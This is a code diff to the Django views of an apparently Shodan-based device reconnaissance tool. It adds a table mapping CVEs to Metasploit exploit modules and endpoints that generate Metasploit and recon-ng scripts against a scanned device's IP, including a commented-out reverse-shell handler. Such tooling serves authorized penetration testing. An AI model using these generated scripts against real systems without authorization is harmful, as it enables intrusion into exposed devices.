@@ -1,7 +1,9 @@
 import ast
+import ipaddress
 import json
 import logging
 import os
+import re
 import time
 from collections import Counter
 from django.conf import settings
@@ -62,9 +64,41 @@ from kamerka.tasks import (
     exploitdb_search,
     capture_screenshot,
     coordinates_queries,
+    nrich_lookup,
+    cvedb_enrich,
+    shodan_intel_scan,
+    shodan_trends_task,
 )
+from shodan import Shodan as _ShodanAPI
 
 _views_logger = logging.getLogger(__name__)
+
+# CVE → Metasploit module path mapping (well-known, high-signal entries only)
+_CVE_TO_MSF = {
+    "CVE-2021-44228": "exploit/multi/misc/log4shell_header_injection",
+    "CVE-2021-45046": "exploit/multi/misc/log4shell_header_injection",
+    "CVE-2017-0144":  "exploit/windows/smb/ms17_010_eternalblue",
+    "CVE-2017-0145":  "exploit/windows/smb/ms17_010_psexec",
+    "CVE-2019-0708":  "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+    "CVE-2020-0796":  "exploit/windows/smb/cve_2020_0796_smbghost",
+    "CVE-2021-26855": "exploit/windows/http/exchange_proxylogon_rce",
+    "CVE-2021-34473": "auxiliary/scanner/http/exchange_proxyshell_url_redirection",
+    "CVE-2022-26134": "exploit/multi/http/atlassian_confluence_rce_cve_2022_26134",
+    "CVE-2022-1388":  "exploit/multi/http/f5_bigip_icontrol_rest_auth_bypass",
+    "CVE-2014-6271":  "exploit/multi/http/apache_mod_cgi_bash_env_exec",
+    "CVE-2017-5638":  "exploit/multi/http/struts2_content_type_ognl",
+    "CVE-2018-7600":  "exploit/unix/http/drupal_drupalgeddon2",
+    "CVE-2019-11510": "auxiliary/scanner/http/pulse_secure_file_read",
+    "CVE-2023-46604": "exploit/multi/misc/apache_activemq_rce_cve_2023_46604",
+    "CVE-2023-23397": "auxiliary/scanner/smtp/cve_2023_23397_outlook_ntlm_theft",
+    "CVE-2019-19781": "exploit/multi/http/citrix_dir_traversal_rce",
+    "CVE-2021-40539": "exploit/multi/http/manageengine_adselfservice_plus_cve_2021_40539",
+    "CVE-2018-13379": "auxiliary/scanner/http/fortios_traversal",
+    "CVE-2021-21985": "exploit/linux/http/vmware_vcenter_uploadova_rce",
+    "CVE-2021-3156":  "exploit/linux/local/sudo_baron_samedit",
+    "CVE-2021-4034":  "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
+    "CVE-2022-0847":  "exploit/linux/local/cve_2022_0847_dirtypipe",
+}
 
 
 def _parse_vulns(raw):
@@ -696,6 +730,7 @@ def device(request, id, device_id, ip):
 
     context = {
         "device": all_devices,
+        "device_ip_safe": all_devices.ip.replace(".", "_"),
         "safe_lat": safe_lat,
         "safe_lon": safe_lon,
         "scan_json": _scan_to_json(all_devices.scan),
@@ -1331,6 +1366,45 @@ def nvd_scan_view(request, id):
     return HttpResponse(json.dumps({"task_id": None}), content_type="application/json")
 
 
+def nrich_scan_view(request, id):
+    """Trigger Shodan InternetDB (nrich) CVE lookup via Celery."""
+    if (
+        request.method == "GET"
+        and request.headers.get("X-Requested-With") == "XMLHttpRequest"
+    ):
+        task = nrich_lookup.delay(device_id=id)
+        return HttpResponse(
+            json.dumps({"task_id": task.id}), content_type="application/json"
+        )
+    return HttpResponse(json.dumps({"task_id": None}), content_type="application/json")
+
+
+def cvedb_enrich_view(request, id):
+    """Trigger Shodan CVEDB enrichment via Celery."""
+    if (
+        request.method == "GET"
+        and request.headers.get("X-Requested-With") == "XMLHttpRequest"
+    ):
+        task = cvedb_enrich.delay(device_id=id)
+        return HttpResponse(
+            json.dumps({"task_id": task.id}), content_type="application/json"
+        )
+    return HttpResponse(json.dumps({"task_id": None}), content_type="application/json")
+
+
+def shodan_intel_view(request, id):
+    """Trigger the combined nrich + CVEDB Shodan intelligence scan via Celery."""
+    if (
+        request.method == "GET"
+        and request.headers.get("X-Requested-With") == "XMLHttpRequest"
+    ):
+        task = shodan_intel_scan.delay(device_id=id)
+        return HttpResponse(
+            json.dumps({"task_id": task.id}), content_type="application/json"
+        )
+    return HttpResponse(json.dumps({"task_id": None}), content_type="application/json")
+
+
 def get_vuln_intel(request, id):
     """Return vulnerability intelligence data for a device."""
     if (
@@ -1351,6 +1425,8 @@ def get_vuln_intel(request, id):
                     "kev_listed": v.kev_listed,
                     "exploit_available": v.exploit_available,
                     "description": v.description[:300],
+                    "ransomware_campaign": v.ransomware_campaign,
+                    "propose_action": v.propose_action[:200] if v.propose_action else "",
                 }
             )
         return HttpResponse(json.dumps(data), content_type="application/json")
@@ -1701,3 +1777,190 @@ def globe_devices_epss_json(request):
         )
 
     return JsonResponse(records, safe=False)
+
+
+def msf_resource_view(request, id):
+    """Generate a Metasploit .rc resource script for the device."""
+    if request.headers.get("X-Requested-With") != "XMLHttpRequest":
+        return HttpResponse(json.dumps({"script": None}), content_type="application/json")
+
+    device = Device.objects.get(id=id)
+    vulns = VulnIntelligence.objects.filter(device=device)
+    # Never embed the server API key in the generated script — the script is
+    # downloaded by the browser and the key would be exposed to the user's
+    # file system and any system that stores the file.
+    ip_safe = device.ip.replace(".", "_")
+
+    # Strip newlines and control chars (including DEL 0x7f) from any field
+    # derived from external data to prevent injection of commands into the script.
+    _sanitize = lambda s: re.sub(r'[\r\n\x00-\x1f\x7f]', ' ', str(s)).strip()
+
+    if device.product:
+        shodan_query = 'product:"{}"'.format(re.sub(r'["\\\r\n\x00-\x1f\x7f]', '', device.product))
+    elif device.type:
+        shodan_query = re.sub(r'["\\\r\n\x00-\x1f\x7f]', '', device.type)
+    else:
+        shodan_query = device.ip
+
+    from datetime import date as _date
+    lines = []
+    lines.append("# Kamerka+ Metasploit Resource Script")
+    lines.append("# Target: {}".format(device.ip))
+    lines.append("# Product: {}".format(_sanitize(device.product or "unknown")))
+    lines.append("# Type: {}".format(_sanitize(device.type or "unknown")))
+    lines.append("# Generated: {}".format(_date.today().isoformat()))
+    lines.append("# Usage: msfconsole -r kamerka_{}.rc".format(ip_safe))
+    lines.append("#")
+    lines.append("# Sections:")
+    lines.append("#   1. shodan_host     — free, 0 credits")
+    lines.append("#   2. shodan_search   — costs 1 query credit")
+    lines.append("#   3. CVE-matched exploit modules")
+    lines.append("")
+    lines.append("# --- 1. Shodan host lookup (free) ---")
+    lines.append("use auxiliary/gather/shodan_host")
+    lines.append("set RHOSTS {}".format(device.ip))
+    lines.append("set SHODAN_APIKEY YOUR_SHODAN_API_KEY")
+    lines.append("run")
+    lines.append("")
+    lines.append("# --- 2. Shodan search (costs 1 query credit) ---")
+    lines.append("use auxiliary/gather/shodan_search")
+    lines.append("set QUERY {}".format(shodan_query))
+    lines.append("set SHODAN_APIKEY YOUR_SHODAN_API_KEY")
+    lines.append("run")
+    lines.append("")
+
+    seen_modules = set()
+    for vi in vulns:
+        msf_module = _CVE_TO_MSF.get(vi.cve_id)
+        if msf_module and msf_module not in seen_modules:
+            seen_modules.add(msf_module)
+            lines.append("# --- CVE: {} ---".format(vi.cve_id))
+            lines.append("use {}".format(msf_module))
+            lines.append("set RHOSTS {}".format(device.ip))
+            lines.append("# set LHOST YOUR_IP")
+            lines.append("# set LPORT 4444")
+            lines.append("# run")
+            lines.append("")
+
+    lines.append("# --- Handler (uncomment to catch shells) ---")
+    lines.append("# use exploit/multi/handler")
+    lines.append("# set PAYLOAD generic/shell_reverse_tcp")
+    lines.append("# set LHOST YOUR_IP")
+    lines.append("# set LPORT 4444")
+    lines.append("# run -j")
+
+    script = "\n".join(lines)
+    return HttpResponse(
+        json.dumps({"script": script, "filename": "kamerka_{}.rc".format(ip_safe)}),
+        content_type="application/json",
+    )
+
+
+def recon_ng_script_view(request, id):
+    """Generate a recon-ng command script for the device."""
+    if request.headers.get("X-Requested-With") != "XMLHttpRequest":
+        return HttpResponse(json.dumps({"script": None}), content_type="application/json")
+
+    device = Device.objects.get(id=id)
+    ip_safe = device.ip.replace(".", "_")
+    workspace = "kamerka_{}".format(ip_safe)
+
+    # Strip newlines/control chars (including DEL 0x7f) from any field derived
+    # from external data to prevent injection of additional recon-ng commands.
+    _sanitize = lambda s: re.sub(r'[\r\n\x00-\x1f\x7f]', ' ', str(s)).strip()
+
+    try:
+        network = ipaddress.ip_network("{}/24".format(device.ip), strict=False)
+        netblock = str(network)
+    except Exception:
+        netblock = device.ip
+
+    hostnames = []
+    if device.hostnames:
+        raw = device.hostnames.strip()
+        if raw.startswith("["):
+            try:
+                parsed = ast.literal_eval(raw)
+                if isinstance(parsed, list):
+                    hostnames = [h for h in parsed if h]
+            except Exception:
+                pass
+        elif raw:
+            hostnames = [raw]
+
+    from datetime import date as _date
+    lines = []
+    lines.append("# Kamerka+ Recon-ng Script")
+    lines.append("# Target: {}".format(device.ip))
+    lines.append("# Generated: {}".format(_date.today().isoformat()))
+    lines.append("# Usage: recon-ng -r kamerka_{}.rng".format(ip_safe))
+    lines.append("")
+    lines.append("workspaces create {}".format(workspace))
+    lines.append("keys add shodan_api YOUR_SHODAN_API_KEY")
+    lines.append("marketplace install shodan")
+    lines.append("")
+    lines.append("# --- Host lookup (free) ---")
+    lines.append("# db insert hosts")
+    lines.append("# ip_address: {}".format(device.ip))
+    lines.append("modules load recon/hosts-ports/shodan_ip")
+    lines.append("run")
+    lines.append("")
+    lines.append("# --- Netblock scan ---")
+    lines.append("# db insert netblocks")
+    lines.append("# netblock: {}".format(netblock))
+    lines.append("modules load recon/netblocks-hosts/shodan_net")
+    lines.append("run")
+    lines.append("")
+
+    if hostnames:
+        lines.append("# --- Domain recon ---")
+        for hostname in hostnames[:3]:
+            lines.append("# db insert domains")
+            lines.append("# domain: {}".format(_sanitize(hostname)))
+        lines.append("modules load recon/domains-hosts/shodan_hostname")
+        lines.append("run")
+        lines.append("")
+
+    if device.org:
+        lines.append("# --- Org recon ---")
+        lines.append("# db insert companies")
+        lines.append("# company: {}".format(_sanitize(device.org)))
+        lines.append("modules load recon/companies-multi/shodan_org")
+        lines.append("run")
+        lines.append("")
+
+    lines.append("show hosts")
+    lines.append("show ports")
+
+    script = "\n".join(lines)
+    return HttpResponse(
+        json.dumps({"script": script, "filename": "kamerka_{}.rng".format(ip_safe)}),
+        content_type="application/json",
+    )
+
+
+def shodan_trends_view(request, id):
+    """Dispatch the shodan_trends_task Celery task."""
+    if request.method == "GET" and request.headers.get("X-Requested-With") == "XMLHttpRequest":
+        task = shodan_trends_task.delay(device_id=id)
+        return HttpResponse(json.dumps({"task_id": task.id}), content_type="application/json")
+    return HttpResponse(json.dumps({"task_id": None}), content_type="application/json")
+
+
+def shodan_credits_view(request):
+    """Return Shodan API credit balance (free, no credits consumed)."""
+    if request.headers.get("X-Requested-With") != "XMLHttpRequest":
+        return HttpResponse(json.dumps({"error": "AJAX only"}), content_type="application/json")
+    key = os.environ.get("SHODAN_API_KEY", "")
+    if not key:
+        return HttpResponse(json.dumps({"error": "no key"}), content_type="application/json")
+    try:
+        info = _ShodanAPI(key).info()
+        return HttpResponse(json.dumps({
+            "query_credits": info.get("query_credits", 0),
+            "scan_credits":  info.get("scan_credits", 0),
+            "plan":          info.get("plan", "unknown"),
+        }), content_type="application/json")
+    except Exception as exc:
+        _views_logger.warning("shodan_credits_view error: %s", exc)
+        return HttpResponse(json.dumps({"error": "Shodan API error"}), content_type="application/json")
